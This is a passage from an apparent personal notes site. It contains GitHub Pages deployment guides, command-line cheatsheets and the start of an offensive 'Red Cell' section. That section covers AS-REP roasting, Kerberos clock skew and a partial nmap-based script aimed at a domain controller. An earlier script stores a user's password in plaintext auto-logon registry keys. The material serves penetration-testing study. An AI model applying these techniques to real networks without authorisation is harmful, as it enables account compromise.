fake_user.exe is missing\n    $Fake_Users = \"$LibDir\\fake_user.exe\"\n\n\n    # Manually Input User Data\n    if ($Manual) {\n        if (!$Username) { Write-Host 'Enter Username: ' -ForegroundColor Yellow -NoNewline ; $Username = Read-Host }\n        if (!$Password) { Write-Host 'Enter Password: ' -ForegroundColor Yellow -NoNewline ; $Password = Read-Host }\n        if (!$DisplayName) { Write-Host 'Enter Display Name: ' -ForegroundColor Yellow -NoNewline ; $DisplayName = Read-Host }\n    }\n\n\n    # Randomly Generate User Data\n    else {\n        if (!(Test-Path -LiteralPath $Fake_Users)) { return (Write-Host \"ERROR: Missing 'fake_user.exe'\" -ForegroundColor Red) }\n        $UserCSV = (. $Fake_Users -n 1 | ConvertFrom-Csv)\n\n        $FirstName     = $UserCSV.first_name\n        $LastName      = $UserCSV.last_name\n        $MI            = ($UserCSV.middle_initial).ToUpper()\n        $Password      = $UserCSV.password\n\n        $Username      = \"$FirstName.$MI.$LastName\"\n        $DisplayName   = \"$FirstName $LastName\"\n    }\n\n\n    # Add local unprivileged user and set them to auto-logon\n    net user \"$Username\" \"$Password\" /FULLNAME:\"$DisplayName\" /ADD\n\n\n    # Hash Values for setting registry key\n    $Hash=@{\n        DefaultUserName=\"$Username\" ;\n        DefaultPassword=\"$Password\" ; \n        DefaultDomainName=\"$Domain\" ; # Not sure if I need this or not\n        AutoAdminLogon='1'\n    }\n\n    foreach ($Key in $Hash.Keys) {\n        Set-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon' -Name $Key -Value $($Hash.$Key)\n    }\n\n\n    # Remove all script files once user emulation is setup\n    if ($Cleanup) {\n        # WIP\n    }\n\n\n    # Restart Computer to auto-logon as new user\n    if ($Restart) {\n        Write-Host \"Restarting computer to begin user emulation...\" -ForegroundColor Yellow\n        Restart-Computer -Force\n    }\n}\n</code></pre>"},{"location":"Green%20Cell/04.%20Github%20Pages/","title":"Github Pages","text":"<ul> <li>Simple collection of notes dedicated to the deployment of static sites using Github Pages.</li> </ul>"},{"location":"Green%20Cell/04.%20Github%20Pages/#table-of-contents","title":"Table of Contents","text":"<ul> <li>MdBook</li> <li>mkDocs</li> </ul>"},{"location":"Green%20Cell/04.%20Github%20Pages/MdBook/","title":"MdBook","text":""},{"location":"Green%20Cell/04.%20Github%20Pages/MdBook/#creating-your-site","title":"Creating your Site:","text":"<p>Note</p> <p>This example is a manual walkthrough of setting up the Github Pages mdBook Workflow WITHOUT having to setup/use <code>mdbook</code> locally on your own system.</p> <ul> <li>Steps 2 through 4 are normally done automatically by running <code>mdbook init</code>.</li> <li>Using a custom domain name is NOT a requirement for setting up a successful Github Page, but I included it in this repository for the sake of completion and vebosity. To skip custom domain configuration:<ul> <li>Remove the <code>[output.html]</code> section from <code>book.toml</code> in step 4.</li> <li>Skip steps 8 and 9 entirely.</li> </ul> </li> </ul>"},{"location":"Green%20Cell/04.%20Github%20Pages/MdBook/#1-create-a-repository","title":"1. Create a repository.","text":""},{"location":"Green%20Cell/04.%20Github%20Pages/MdBook/#2-create-a-src-directory","title":"2. Create a <code>src</code> directory.","text":""},{"location":"Green%20Cell/04.%20Github%20Pages/MdBook/#3-place-all-markdown-files-aka-the-site-contents-into-the-src-directory","title":"3. Place all Markdown files (aka the site contents) into the <code>src</code> directory.","text":"<ul> <li>The root <code>.md</code> file should be <code>SUMMARY.md</code>.</li> <li>Formatting documentation can be found here.</li> <li>Example <code>SUMMARY.md</code>:</li> </ul> <pre><code># Summary\n\n# Primary Section\n- [mdBook Github Page Creation](Primary%20Directory/mdBook_GithubPages_Creation.md)\n\n# Secondary Section\n- [Obsidian Markdown Comparison](Secondary%20Directory/Obsidian_Markdown_Comparison.md)\n\n# Tertiary Section\n- [Export-Obsidian.ps1](Tertiary%20Directory/Export-Obsidian.md)\n</code></pre>"},{"location":"Green%20Cell/04.%20Github%20Pages/MdBook/#4-include-a-simple-booktoml","title":"4. Include a simple <code>book.toml</code>","text":"<ul> <li>Your custom domain name should be included.</li> <li>Simply remove the <code>[output.html]</code> section to avoid custom domain configuration.</li> <li>If no domain name is specified, Github Pages will opt for: <code>https://&lt;username&gt;.github.io/&lt;repository&gt;</code></li> <li>Example <code>book.toml</code>:</li> </ul> <pre><code>[book]\nauthors = [\"Tyler McCann (@tylerdotrar)\"]\nlanguage = \"en\"\nmultilingual = false\nsrc = \"src\"\ntitle = \"Example mdBook Site\"\n\n[build]\nbuild-dir = \"public\"\n\n[output.html]\ncname=\"example.hotbox.zip\"\n</code></pre>"},{"location":"Green%20Cell/04.%20Github%20Pages/MdBook/#5-enable-read-write-permissions-for-workflows-using-the-github_token","title":"5. Enable 'Read &amp; Write Permissions' for Workflows using the GITHUB_TOKEN.","text":"<ul> <li><code>Repository --&gt; Settings --&gt; Actions --&gt; General --&gt; Workflow Permissions</code></li> </ul>"},{"location":"Green%20Cell/04.%20Github%20Pages/MdBook/#6-create-mdbook-workflow-mdbookyml","title":"6. Create mdBook Workflow (<code>mdbook.yml</code>)","text":"<ul> <li><code>Repository --&gt; Actions --&gt; Pages --&gt; View All --&gt; mdBook --&gt; Configure</code></li> <li>The default deployment yelled at me, so I opted for a simpler, custom <code>mdbook.yml</code>.</li> <li>You should be able to copy and paste this example file verbatim.</li> <li>Example <code>mdbook.yml</code>:</li> </ul> <pre><code>name: Deploy mdBook Github Pages\n\non:\n  push:\n    branches:\n      - main\n  pull_request:\n\njobs:\n  deploy:\n    runs-on: ubuntu-20.04\n    concurrency:\n      group: ${{ github.workflow }}-${{ github.ref }}\n    steps:\n      - uses: actions/checkout@v2\n\n      - name: Setup mdBook\n        uses: peaceiris/actions-mdbook@v1\n        with:\n          mdbook-version: '0.4.21'\n          # mdbook-version: 'latest'\n\n      - run: mdbook build\n\n      - name: Deploy\n        uses: peaceiris/actions-gh-pages@v3\n        if: ${{ github.ref == 'refs/heads/main' }}\n        with:\n          github_token: ${{ secrets.GITHUB_TOKEN }}\n          publish_dir: ./public\n</code></pre>"},{"location":"Green%20Cell/04.%20Github%20Pages/MdBook/#7-set-your-github-page-deployment-to-the-gh-pages-branch","title":"7. Set your Github Page deployment to the 'gh-pages' branch.","text":"<ul> <li>The 'gh-pages' branch will be created by the <code>mdbook.yml</code> workflow (assuming no errors occur).</li> <li>Once it is created, you can set that branch as your deployment branch.</li> </ul>"},{"location":"Green%20Cell/04.%20Github%20Pages/MdBook/#8-create-a-cname-record-to-point-your-custom-domain-to-the-github-pages-site","title":"8. Create a CNAME record to point your custom domain to the Github Pages site.","text":"<ul> <li>Documentation on configuring subdomains with Github Pages can be found here.</li> <li>This step will vary for everyone, so below is my experience with Cloudflare.</li> </ul>"},{"location":"Green%20Cell/04.%20Github%20Pages/MdBook/#9-add-your-target-domain-to-your-repository-settings","title":"9. Add your target Domain to your Repository settings.","text":"<ul> <li><code>Repository --&gt; Settings --&gt; Pages --&gt; Custom Domain</code></li> <li>Once your CNAME finishes propegating, your mdBook should now be accessible.</li> </ul>"},{"location":"Green%20Cell/04.%20Github%20Pages/MdBook/#10-flex-on-your-peers","title":"10. Flex on your peers.","text":"<ul> <li>The finalized directory should look something like this: <pre><code>MyRepo\n|\n|__ src\n|   |\n|   |__ attachments\n|   |   |__ Pasted image 202307071.png\n|   |   |__ Pasted image 202307072.png\n|   |   |__ Pasted image 202307073.png\n|   |\n|   |__ CoolNote1.md\n|   |__ CoolNote2.md\n|   |__ SUMMARY.md\n|\n|__ README.md\n|__ book.toml\n</code></pre></li> </ul>"},{"location":"Green%20Cell/04.%20Github%20Pages/mkDocs/","title":"mkDocs","text":""},{"location":"Green%20Cell/04.%20Github%20Pages/mkDocs/#creating-your-site","title":"Creating your Site:","text":"<p>Note</p> <p>This example is a manual walkthrough of setting up the Github Pages mdBook Workflow utilizing an Obsidian Vault WITHOUT having to setup/use <code>mkdocs</code> locally on your own system.</p>"},{"location":"Green%20Cell/04.%20Github%20Pages/mkDocs/#1-create-a-repository","title":"1. Create a repository.","text":""},{"location":"Green%20Cell/04.%20Github%20Pages/mkDocs/#2-add-your-obsidian-vault","title":"2. Add your Obsidian Vault.","text":"<ul> <li>This Vault should contain a root <code>index.md</code> or <code>README.md</code> for navigation.</li> </ul>"},{"location":"Green%20Cell/04.%20Github%20Pages/mkDocs/#3-create-an-mkdocsyml-file","title":"3. Create an <code>mkdocs.yml</code> file.","text":"<ul> <li>This file should point to your Obsidian Vault if the root directory isn't named <code>docs</code>.</li> </ul> <pre><code>site_name: MkDocs Example\nsite_author: Tyler McCann\ndocs_dir: vault # Root Directory (Obsidian Vault)\nrepo_name: tylerdotrar/notreal-mkdocs\nrepo_url: https://github.com/tylerdotrar/notreal-mkdocs\n\n# Material Configuration\ntheme:\n  name: material\n  custom_dir: assets # Overrides folder containing 'home.html'\n\n  features:\n    - navigation.tabs\n    - navigation.tabs.sticky\n\n  palette:\n    # Light Mode\n    - media: \"(prefers-color-scheme: light)\"\n      scheme: default\n      primary: deep orange\n      accent: indigo\n      toggle:\n        icon: material/toggle-switch-off-outline\n        name: Switch to Dark Mode\n\n    # Dark Mode\n    - media: \"(prefers-color-scheme: dark)\"\n      scheme: slate\n      primary: teal\n      accent: indigo\n      toggle:\n        icon: material/toggle-switch\n        name: Switch to Light Mode\n\nplugins:\n  - search\n  - roamlinks # Obsidian Style Image Support\n</code></pre>"},{"location":"Green%20Cell/04.%20Github%20Pages/mkDocs/#4-enable-read-write-permissions-for-workflows-usingthe-github_token","title":"4. Enable 'Read &amp; Write Permissions' for Workflows usingthe GITHUB_TOKEN.","text":"<ul> <li><code>Repository --&gt; Settings --&gt; Actions --&gt; General --&gt; Workflow Permissions</code></li> </ul>"},{"location":"Green%20Cell/04.%20Github%20Pages/mkDocs/#5-create-githubworkflowsdeploy-mkdocsyml-using-mkocs-deploy-gh-pages","title":"5. Create <code>.github/workflows/deploy-mkdocs.yml</code> using mkocs-deploy-gh-pages..","text":"<pre><code># Using the workflow from: \"https://github.com/mhausenblas/mkdocs-deploy-gh-pages\"\nname: Publish mkDocs via GitHub Pages\non:\n  push:\n    branches:\n      - main\n\njobs:\n  build:\n    name: Deploy MkDocs\n    runs-on: ubuntu-latest\n    steps:\n      - name: Checkout main\n        uses: actions/checkout@v2\n\n      - name: Deploy docs\n        uses: mhausenblas/mkdocs-deploy-gh-pages@master\n        # Or use mhausenblas/mkdocs-deploy-gh-pages@nomaterial to build without the mkdocs-material theme\n        env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n          CONFIG_FILE: mkdocs.yml\n          # REQUIREMENTS: requirements.txt\n          # EXTRA_PACKAGES: build-base\n          # CUSTOM_DOMAIN: optionaldomain.com\n          # GITHUB_DOMAIN: github.myenterprise.com\n</code></pre>"},{"location":"Green%20Cell/04.%20Github%20Pages/mkDocs/#6-set-your-github-page-deployment-to-the-gh-pages-branch","title":"6. Set your Github Page deployment to the 'gh-pages' branch.","text":"<ul> <li>The 'gh-pages' branch will be created by the <code>mdbook.yml</code> workflow (assuming no errors occur).</li> <li>Once it is created, you can set that branch as your deployment branch.</li> </ul>"},{"location":"Green%20Cell/05.%20General%20CLI%20Functions/","title":"General CLI Functions","text":"<ul> <li>Broad collection of simple cheatsheets covering common functionality of different tools and systems (e.g., neovim, i3, etc.).</li> </ul>"},{"location":"Green%20Cell/05.%20General%20CLI%20Functions/#table-of-contents","title":"Table of Contents","text":"<ul> <li>Recursively Search for Files</li> <li>Remove Text from PDFs</li> <li>Replacing Tabs and Newlines</li> </ul>"},{"location":"Green%20Cell/05.%20General%20CLI%20Functions/Recursively%20Search%20for%20Files/","title":"Recursively Search for Files","text":""},{"location":"Green%20Cell/05.%20General%20CLI%20Functions/Recursively%20Search%20for%20Files/#linux","title":"Linux","text":"<pre><code># Search Entire File System for File\nfind / -name \"user.txt\" 2&gt;/dev/null\n\n# Search Entire File System for Pattern\nfind / -name \"*.txt\" 2&gt;/dev/null\n\n# Search for Files containing a String\ngrep -r \"search_string\" /path/to/search/directory\n</code></pre>"},{"location":"Green%20Cell/05.%20General%20CLI%20Functions/Recursively%20Search%20for%20Files/#windows","title":"Windows","text":"<ul> <li> <p>PowerShell <pre><code># Search Entire File System for File\nGet-ChildItem -Path C:/ -Recurse -Filter \"user.txt\" 2&gt;$NULL\n# Including Hidden Files\nGet-ChildItem -Path C:/ -Recurse -Hidden -Filter \"user.txt\" 2&gt;$NULL\n\n# Search Entire File System for Pattern\nGet-ChildItem -Path C:/ -Recurse -Filter \"user.txt\" 2&gt;$NULL\nGet-ChildItem -Path C:/ -Recurse -Hidden -Filter \"*.txt*\" 2&gt;$NULL\n</code></pre></p> </li> <li> <p>CMD <pre><code># Search Entire File System for File (including Hidden Files)\ndir /s /b C:\\user.txt 2&gt;nul\n\n# Search Entire File Sytem for Pattern (including Hidden Files)\ndir /s /b /a C:\\*.txt 2&gt;nul\n</code></pre></p> </li> </ul>"},{"location":"Green%20Cell/05.%20General%20CLI%20Functions/Remove%20Text%20from%20PDFs/","title":"Remove Text from PDFs","text":""},{"location":"Green%20Cell/05.%20General%20CLI%20Functions/Remove%20Text%20from%20PDFs/#linux","title":"Linux","text":"<pre><code># Uncompress PDF\npdftk &lt;original_file&gt;.pdf output &lt;uncompressed_file&gt;.pdf uncompress\n\n# Edit Uncompressed PDF with a text editor\nsed -e \"s/watermarktextstring/ /\" &lt;uncompressed_file&gt;.pdf &gt; &lt;uncompressed_edited&gt;.pdf\n\n# Recompress PDF\npdftk &lt;uncompressed_edited&gt;.pdf output &lt;new_file&gt;.pdf compress\n</code></pre>"},{"location":"Green%20Cell/05.%20General%20CLI%20Functions/Replacing%20Tabs%20and%20Newlines/","title":"Replacing Tabs and Newlines","text":""},{"location":"Green%20Cell/05.%20General%20CLI%20Functions/Replacing%20Tabs%20and%20Newlines/#linux","title":"Linux","text":"<pre><code># Replace '\\n' with newlines and '\\t' for tabs:\ncat &lt;filename&gt; | sed 's/\\\\n/\\n/g' | sed 's/\\\\t/\\t/g' &gt; &lt;filename&gt;\n</code></pre>"},{"location":"Green%20Cell/05.%20General%20CLI%20Functions/Replacing%20Tabs%20and%20Newlines/#windows","title":"Windows","text":"<ul> <li> <p>PowerShell <pre><code># Replace '\\n' with newlines and '\\t' for tabs:\n(Get-Content -Raw -Path &lt;filename&gt;) -replace '\\\\n', \"`n\" -replace '\\\\t', \"`t\" | Set-Content -Path &lt;filename&gt;\n</code></pre></p> </li> <li> <p>CMD <pre><code>yikes\n</code></pre></p> </li> </ul>"},{"location":"Green%20Cell/06.%20Tool%20Cheatsheets/","title":"Tool Cheatsheets","text":"<ul> <li>Broad collection of simple cheatsheets covering common functionality of different tools and systems (e.g., neovim, i3, etc.).</li> </ul>"},{"location":"Green%20Cell/06.%20Tool%20Cheatsheets/#table-of-contents","title":"Table of Contents","text":"<ul> <li>Git Cheatsheet</li> <li>i3 Cheatsheet</li> <li>Neovim Cheatsheet</li> <li>Package Manager Cheatsheet</li> </ul>"},{"location":"Green%20Cell/06.%20Tool%20Cheatsheets/Git%20Cheatsheet/","title":"Git Cheatsheet","text":"<p>Info</p> <p>This note is still in development.</p>"},{"location":"Green%20Cell/06.%20Tool%20Cheatsheets/Git%20Cheatsheet/#creating-a-new-repository","title":"Creating a new Repository","text":"<pre><code># Creating a brand new Git Repository from CLI\n\n# In your current project repository (e.g., CoolCode)\ngit init\n\n# Create README\necho \"# CoolCode Repository\" &gt; README.md\n\n# Add ALL files within the current directory\ngit add -A .\n\ngit commit -m \"Initial Commit\"\n\n# Github CLI to create a new public repo\ngh repo create &lt;repo_name&gt; --public\n\ngit remote add origin https://github.com/&lt;username&gt;/&lt;repo_name&gt;\ngit push -u origin master\n</code></pre>"},{"location":"Green%20Cell/06.%20Tool%20Cheatsheets/Git%20Cheatsheet/#removing-prior-commit","title":"Removing prior commit","text":"<pre><code>git push -f origin HEAD^:main\n</code></pre>"},{"location":"Green%20Cell/06.%20Tool%20Cheatsheets/Git%20Cheatsheet/#force-a-pull-request-overwriteremove-local-files","title":"Force a Pull Request (overwrite/remove local files)","text":"<pre><code># Remove all uncommitted changes\ngit reset --hard HEAD\n\n# See what local files will be deleted\ngit clean -f -d --dry-run\n\n# Delete all untracked files/directories\ngit clean -f -d\n\n# Sync with repo\ngit pull\n</code></pre>"},{"location":"Green%20Cell/06.%20Tool%20Cheatsheets/Neovim%20Cheatsheet/","title":"Neovim Cheatsheet","text":""},{"location":"Green%20Cell/06.%20Tool%20Cheatsheets/Neovim%20Cheatsheet/#default-keybindings","title":"Default Keybindings","text":"<pre><code># Common\nEsc        = Normal Mode\nI          = Insert Mode (Exact)\nO          = Insert Mode (New Line Below)\nShift + O  = Insert Mode (New Line Above)\n:x         = Save and Quit\n:wq!       = Save and Quit (Alternate)\n:q!        = Force Quit\n:w!        = Force Save\n</code></pre> <pre><code># Movement\nHome       = Beginning of Line\nEnd        = End of Line\nShift + G  = Beginning of File\nG + G      = End of File\n</code></pre> <pre><code># Movement (Esoteric)\nJ          = Increment Up\nK          = Increment Down\nH          = Increment Left\nL          = Increment Right\n</code></pre> <pre><code># Text Manipulation\nV          = Visual Mode (Granular Highlight)\nShift + V  = Visual Mode (Line Highlight)\nY          = Copy Highlighted\nShift + Y  = Copy Line\nD          = Delete Highlighted\nD + D      = Delete Line\nX          = Remove Character After (Del)\nShift + X  = Remove Character Prior (Backspace)\nP          = Paste\nU          = Undo\n</code></pre> <pre><code># Search\n/&lt;string&gt;  = Find\nN          = Next Match\nShift + N  = Previous Match\n</code></pre>"},{"location":"Green%20Cell/06.%20Tool%20Cheatsheets/Package%20Manager%20Cheatsheet/","title":"Package Manager Cheatsheet","text":""},{"location":"Green%20Cell/06.%20Tool%20Cheatsheets/Package%20Manager%20Cheatsheet/#overview","title":"Overview","text":"<p>CLI Package Managers are tools that facilitate the installation, removal, and management of software packages on a system through the command line. These package managers streamline the process of handling dependencies, ensuring software compatibility, and automating updates. Users can use these tools to search for, install, and manage software packages efficiently, making it easier to maintain a well-configured and up-to-date system while avoiding the complexities of manual installations and dependency resolution. </p> <p>Example Package Managers: - apt for Debian-based Linux distributions - pacman for Arch Linux (with yay as an AUR helper) - winget for Windows</p>"},{"location":"Green%20Cell/06.%20Tool%20Cheatsheets/Package%20Manager%20Cheatsheet/#apt","title":"apt","text":"<p><code>apt</code> is the default package manager for Debian-based Linux distributions, handling tasks like installation, removal, and system updates by installing pre-compiled binaries from official repositories. It ensures software compatibility, manages dependencies, and provides commands for package search, updates, and system upgrades.</p> <p>Other tools, such as <code>apt-get</code> and <code>aptitude</code>, share similar syntax and functionality, allowing users to interchangeably manage packages on Debian-based systems.</p> <pre><code># Update Package Lists &amp; Upgrade all Packages (Force)\nsudo apt update &amp;&amp; sudo apt upgrade -y\n\n# Full Upgrade System (will remove packages if necessary for upgrade)\nsudo apt full-upgrade\n\n# Remove Old / Deprecated Dependencies\nsudo apt autoremove\n\n# Search for Packages\nsudo apt search &lt;package_name&gt;\n\n# Install a Package\nsudo apt install &lt;package_name&gt; -y\n\n# Remove Package\nsudo apt remove &lt;package_name&gt;\n</code></pre>"},{"location":"Green%20Cell/06.%20Tool%20Cheatsheets/Package%20Manager%20Cheatsheet/#pacman-yay","title":"pacman / yay","text":"<p><code>pacman</code> is the primary package manager for Arch Linux that installs pre-compiled binaries from official repositories, whereas <code>yay</code> is a wrapper for it that can also install packages from the unofficial AUR (Arch User Repository).</p> <p><code>yay</code> syntax is mostly identical to <code>pacman</code>, so the following switches <code>pacman</code> switches should work identically with <code>yay</code>.  Variations will be notated.</p> <pre><code># Update Package Lists (-Syy) &amp; Upgrade all Packages (-Syu)\nsudo pacman -Syyu\nsudo yay\n\n# Search for package or packages in the repositories \npacman -Ss &lt;package_name&gt;     \nyay &lt;package_name&gt;\n\n# Return detailed information about a specific package\npacman -Si &lt;package_name&gt;\n\n# Install a Package (or upgrade existing package)\nsudo pacman -S &lt;package_name&gt;\n\n# Install a Package (downloaded locally)\nsudo pacman -U  &lt;package_name&gt;.pkg.tar.xz\n\n# Remove package (but retain its configuration and deps)\nsudo pacman -R  &lt;package_name&gt;\n\n# Remove package, its configuration and all unwanted dependencies \nsudo pacman -Rns &lt;package_name&gt;\n\n# Remove Orphaned Packages\nsudo pacman -Rns $(pacman -Qdtq)\nsudo yay -Qtd \n\n# Clean up Package Cache\nsudo pacman -Sc\n</code></pre>"},{"location":"Green%20Cell/06.%20Tool%20Cheatsheets/Package%20Manager%20Cheatsheet/#winget","title":"winget","text":"<p><code>winget</code> is the native package manager for Windows, inspired by Linux package managers. It installs applications from the Microsoft Store and other supported sources, providing a streamlined process for users to maintain and update their software. Its straightforward syntax and integration with Windows make it an efficient tool for managing applications on the Microsoft operating system.</p> <pre><code># Search for Packages\nwinget search \"&lt;package_name&gt;\"\n\n# Install Package via Name\nwinget install \"&lt;package_name&gt;\"\n\n# Install Package via ID (unique)\nwinget install --id &lt;package.id&gt;\n\n# Remove Package\nwinget uninstall \"&lt;package_name&gt;\"\n\n# List all Installed Packages\nwinget list\n\n# List all Packages w/ Available Update\nwinget upgrade\n\n# Upgrade Package\nwinget upgrade \"&lt;package_name&gt;\"\n</code></pre>"},{"location":"Green%20Cell/06.%20Tool%20Cheatsheets/i3%20Cheatsheet/","title":"i3 Cheatsheet","text":""},{"location":"Green%20Cell/06.%20Tool%20Cheatsheets/i3%20Cheatsheet/#keybindings","title":"Keybindings","text":"<p>Info</p> <p>Keybindings are configured in: <code>~/.config/i3/config</code></p> <pre><code># Primary Function Key\nMod                   = Windows Key (optional: Left Alt)\n\n# Common Functionality\nMod + Enter           = New Terminal Window\nMod + W               = New Firefox Window\nMod + Q               = Kill Focused window\nMod + H               = Open New Windows Horizontally\nMod + V               = Open New Windows Vertically\n\n# Movement &amp; Navigation\nMod + &lt;num&gt;           = Change Workspace\nMod + Shift + &lt;num&gt;   = Move Focused Window to Specified Workspace\nMod + &lt;arrow&gt;         = Change Focused Window within Current Workspace\nMod + Shift + &lt;arrow&gt; = Move Focused Window within Current Workspace\nMod + F               = Fullscreen Current Focused Window\nMod + Shift + Space   = Center and Hover Current Focused Window\nMod + &lt;click_drag&gt;    = Drag Window within Current Workspace\n\n# Process Navigation\nMod + T               = List/Search All Open Processes (fancy Alt + Tab)\nMod + D               = List/Search Application to Launch\nMod + Shift + R       = Reload i3 Window Manager\n\n# Window Orientation\nMod + E               = Split Window View (default)\nMod + S               = Stacked Window view (kinda ugly)\nMod + Shift + G       = Tabbed Window View (eh)\n</code></pre>"},{"location":"Red%20Cell/","title":"Red Cell Overview","text":"<p>Info</p> <p>Red Cell\u00a0| Everything Offensive, Pentesting, &amp; Red Teaming</p>"},{"location":"Red%20Cell/#01-active-directory-ad","title":"01. Active Directory (AD)","text":"<ul> <li>Active Directory (AD) is a Microsoft directory service that centralizes network management, enabling the organization to securely manage and authenticate users, computers, and resources in a Windows environment.</li> </ul>"},{"location":"Red%20Cell/#02-ieee-80211-wireless-lan","title":"02. IEEE 802.11 (Wireless LAN)","text":"<ul> <li>IEEE 802.11, commonly known as Wi-Fi, is a set of standards for wireless local area networks (LANs) that facilitate wireless communication between devices, enabling wireless internet access and local network connections.</li> </ul>"},{"location":"Red%20Cell/#03-enumeration","title":"03. Enumeration","text":"<ul> <li>Enumeration is the process of gathering information about a target, such as network services, user accounts, or system configurations, to identify potential vulnerabilities for exploitation.</li> </ul>"},{"location":"Red%20Cell/#04-privilege-escalation","title":"04. Privilege Escalation","text":"<ul> <li>Privilege escalation is the act gaining higher levels of access or permissions on a computer system or network in order to perform actions that would normally be restricted.</li> </ul>"},{"location":"Red%20Cell/#05-tunneling-lateral-movement","title":"05. Tunneling &amp; Lateral Movement","text":"<ul> <li>Tunneling (specifically proxying) is a technique that facilitates secure data transfer through encrypted channels, often used for lateral movement within a compromised network. It allows attackers to navigate by moving through an intermediate target to gain access to further network resources while evading detection.</li> </ul>"},{"location":"Red%20Cell/#06-file-transfers","title":"06. File Transfers","text":"<ul> <li>File transferring is the process of moving files or data between different systems, either within the same network or across networks for exfiltrating sensitive information or delivering malware.</li> </ul>"},{"location":"Red%20Cell/#07-payloads","title":"07. Payloads","text":"<ul> <li>Payloads are the specific code in an attack (generally initial access) aimed at performing a specific actions on a targeted system, such as delivering malware, executing exploits, or enabling unauthorized access.</li> </ul>"},{"location":"Red%20Cell/#08-defense-evasion","title":"08. Defense Evasion","text":"<ul> <li>Defense evasion encompasses a range of techniques to circumvent or disable security measures, such as intrusion detection systems or antivirus software, allowing unhindered/undetected action on a target.</li> </ul>"},{"location":"Red%20Cell/#09-credential-dumping","title":"09. Credential Dumping","text":"<ul> <li>Credential dumping involves extracting and collecting user login credentials or password hashes from a compromised system, allowing unauthorized access to additional network resources.</li> </ul>"},{"location":"Red%20Cell/#10-persistence","title":"10. Persistence","text":"<ul> <li>Persistence is the technique of maintaining unauthorized access to a compromised system or network over an extended period, ensuring continued control and the ability to carry out activities even after initial access has been achieved.</li> </ul>"},{"location":"Red%20Cell/#11-web-exploitation","title":"11. Web Exploitation","text":"<ul> <li>Web exploitation involves the identification and exploitation of vulnerabilities within web applications or services to gain unauthorized access, steal data, or deliver malicious payloads.</li> </ul>"},{"location":"Red%20Cell/#12-sql","title":"12. SQL","text":"<ul> <li>SQL, or Structured Query Language, is a domain-specific programming language used for managing and manipulating relational databases, allowing for tasks like data retrieval, modification, and administration.</li> </ul>"},{"location":"Red%20Cell/#13-industrial-control-systems-ics","title":"13. Industrial Control Systems (ICS)","text":"<ul> <li>ICS, or Industrial Control Systems, encompasses various types of control systems used in industrial and critical infrastructure settings. These systems are designed to control and monitor physical processes, machinery, and devices.</li> </ul>"},{"location":"Red%20Cell/#14-cheatsheets","title":"14. Cheatsheets","text":"<ul> <li>This section covers the TL;DR (Too Long; Didn't Read) notes of different toolsets.  Instead of reading large and verbose wikis, this will give you a simple introduction.</li> </ul>"},{"location":"Red%20Cell/#15-technique-ted-talks-ttts","title":"15. Technique Ted Talks (TTTs)","text":"<ul> <li>Technique Ted Talks (TTTs) is a miscellaneous section containing notes covering an overview of/introduction to topics that may be implied (or not implicitly covered in depth) in other notes.</li> </ul>"},{"location":"Red%20Cell/01.%20Active%20Directory%20%28AD%29/","title":"Active Directory (AD)","text":"<ul> <li>Active Directory (AD) is a Microsoft directory service that centralizes network management, enabling the organization to securely manage and authenticate users, computers, and resources in a Windows environment.</li> </ul>"},{"location":"Red%20Cell/01.%20Active%20Directory%20%28AD%29/#table-of-contents","title":"Table of Contents","text":""},{"location":"Red%20Cell/01.%20Active%20Directory%20%28AD%29/#exploitation","title":"Exploitation","text":"<ul> <li>AD CS</li> <li>AS-REP Roasting</li> <li>Clock Skew Synchronization</li> <li>Delegation</li> <li>Golden Ticket Attack</li> <li>Kerberoasting</li> </ul>"},{"location":"Red%20Cell/01.%20Active%20Directory%20%28AD%29/#kerberos-overview","title":"Kerberos Overview","text":"<ul> <li>Authentication Overview</li> <li>Component Overview</li> </ul>"},{"location":"Red%20Cell/01.%20Active%20Directory%20%28AD%29/Exploitation/AD%20CS/","title":"AD CS","text":"<p>Info</p> <p>This note is still in development.</p>"},{"location":"Red%20Cell/01.%20Active%20Directory%20%28AD%29/Exploitation/AD%20CS/#overview","title":"Overview","text":"<p>Active Directory Certificate Services (AD CS) is a Windows Server role (similar to IIS, DHCP, DNS, etc.) that is used for issuing and managing Public Key Infrastructure (PKI) certificates within a domain.  This is utilized for secure communication and authentication protocols.</p> <p>Features that AD CS provides includes:</p> <ul> <li>Root and subordinate Certificate Authorities (CA's).</li> <li>Certificate enrollment policy management and enrollment.</li> <li>TPM (Trusted Platform Module)  key attestation.</li> <li>etc., etc., etc.</li> </ul> <p>Because of AD CS' scale and utilization in authentication, we can...</p>"},{"location":"Red%20Cell/01.%20Active%20Directory%20%28AD%29/Exploitation/AD%20CS/#example","title":"Example","text":""},{"location":"Red%20Cell/01.%20Active%20Directory%20%28AD%29/Exploitation/AS-REP%20Roasting/","title":"AS REP Roasting","text":"<p>Info</p> <p>This note is still in development.</p>"},{"location":"Red%20Cell/01.%20Active%20Directory%20%28AD%29/Exploitation/AS-REP%20Roasting/#overview","title":"Overview","text":"<p>AS-REP roasting is an attack technique that targets domain accounts with Kerberos Pre-Authentication disabled.</p> <p>Domain accounts with Kerberos pre-authentication disabled do not have to encrypt their AS-REQ  (Authentication Service Request) with their shared secret (aka their NTLM password), meaning attackers can request and acquire a TGT on behalf of these users without knowing their credentials.</p>"},{"location":"Red%20Cell/01.%20Active%20Directory%20%28AD%29/Exploitation/AS-REP%20Roasting/#exploitation","title":"Exploitation","text":""},{"location":"Red%20Cell/01.%20Active%20Directory%20%28AD%29/Exploitation/Clock%20Skew%20Synchronization/","title":"Clock Skew Synchronization","text":"<p>(Thank you @NukingDragons)</p>"},{"location":"Red%20Cell/01.%20Active%20Directory%20%28AD%29/Exploitation/Clock%20Skew%20Synchronization/#overview","title":"Overview","text":"<p>Timestamps are a fundamental part of Kerberos authentication, with a 5 minute variation being the default tolerance.  The purpose of this is to reduce the viability of \"replay\" attacks. Because of this, a lot of Active Directory attacks require the attacker's clock to be synchronized with the Domain Controller's.</p>"},{"location":"Red%20Cell/01.%20Active%20Directory%20%28AD%29/Exploitation/Clock%20Skew%20Synchronization/#sync-clockskewsh","title":"sync-clockskew.sh","text":"<p>This script synchronizes the attacker's clock screw with a target Domain Controller.</p> <pre><code>#!/bin/bash\n\nif [[ $# != 1 ]]\nthen\n    echo \"Usage: sync-clockskew &lt;dc_ip&gt;\"\n    exit 1\nfi\n\necho \"[+] Fetching clock skew (this can take a minute)...\"\nCLOCK_SKEW=$(sudo nmap -sC -sV -p445 $1 2&gt;&amp;1 | grep 